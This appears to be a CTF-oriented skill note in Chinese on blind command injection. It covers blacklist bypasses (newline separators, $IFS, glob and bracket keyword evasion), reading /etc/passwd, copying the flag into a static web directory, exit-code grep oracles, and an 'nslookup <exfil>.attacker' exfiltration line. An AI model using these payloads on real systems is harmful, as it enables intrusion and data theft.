---
name: Blind Cmd Injection Blacklist Bypass
description: 盲命令注入（仅退出码回显）黑名单绕过与无回显外带：换行分隔、$IFS、glob/[x]、cp 进静态目录
triggers: blind cmd, 盲命令, 黑名单, 无回显, no echo, exit code, $IFS, glob
category: web
---

# 盲命令注入：黑名单绕过与无回显外带

适用：Web 功能把用户输入拼进 `sh -c "ping <target>"` / `nslookup <target>` 等命令，输入有黑名单校验，且**命令 stdout/stderr 不回显、只通过退出码返回两种固定摘要**（盲 oracle）。

## 第一步：审计源码找注入点与黑名单漏项

- 找 `exec.Command("sh", "-c", ...)` / `system()` / `os.system` 拼接处。
- 逐字符核对黑名单：常见漏项是**换行符 `\n`**（黑名单常只写空格/制表/回车 ` \t\r`）。shell 中换行等价于 `;` 分隔命令。
- 注意 `TrimSpace` 只剥首尾空白，字符串中间的 `\n` 保留。
- 先做 oracle 验证：注入 `true`（退出 0 → "可达"类摘要）vs `false`（退出非 0 → "无响应"类摘要），确认命令真正执行且退出码可观测。

## 绕过手法（按黑名单类型）

| 被禁 | 绕过 |
|---|---|
| 空格/制表 | `$IFS`（未加引号展开为空白并被分词，如 `cat$IFS/etc/passwd`）；注意每个参数间都要放 `$IFS`，`-q'^pat'` 会粘成一个参数 |
| `; \| &` 分隔符 | 换行符 `\n`（URL 编码 `%0A`） |
| `$( )` / 反引号 | 不能用命令替换；改用退出码 oracle + grep 逐字符判定 |
| 关键字（如 `flag`/`cat`/`bash`/`curl`/`base64`） | glob 通配：`/fla?`、`/[f]lag`；输出关键字也可用正则方括号 `[f][l][a][g]`。**注意黑名单若用子串 Contains 检查，`[&]` 这类写法挡不住 `&` 单字符被禁**——方括号只对"多字母关键字"有效 |
| 重定向 `< >` | 无法写文件；用 cp 复制到可读位置代替 |

## 无回显外带三板斧

1. **Web 静态目录直读（最优）**：先摸清应用是否映射了本地目录做静态文件（如 `http.FileServer(http.Dir("/app/public"))` 挂在 `/static/`）。然后 `cp /fla? /app/public/[f]lag`——源 glob 会展开成 `/flag`，**目的地的 glob 因文件尚不存在不会展开**，会创建字面名 `[f]lag` 的文件，URL 编码访问 `/static/%5Bf%5Dlag` 即可直接读。若目标目录不存在，可先 `mkdir -p`（mkdir 通常不在黑名单）。
2. **退出码逐字符 oracle**：`grep -q '^[f][l][a][g][{][c]' /fla?`，匹配 → grep 退出 0 → 摘要 A；不匹配 → 退出 1 → 摘要 B。已知前缀逐位扩展，方括号形式避免触发 `flag` 关键字；`$` 结尾锚定可验证 flag 完整。用 `grep -E '^.{N}[a-l]'` 可做区间二分加速（每字符约 5 次请求）。
3. **其他**：若应用支持 DNS/HTTP 回调且容器有出网，可尝试 `nslookup <exfil>.attacker`（但盲场景常无出网）。

## 要点

- 先验证注入真假，再决定外带方案；cp 到静态目录比逐字符 oracle 快几个数量级。
- 判定"命令执行成功"用退出码摘要的区分度：构造 A 命令必然 0、B 命令必然非 0 对照。
- 参考 [[web-rce-playbook]]、[[web-file-read-rce-chain]]。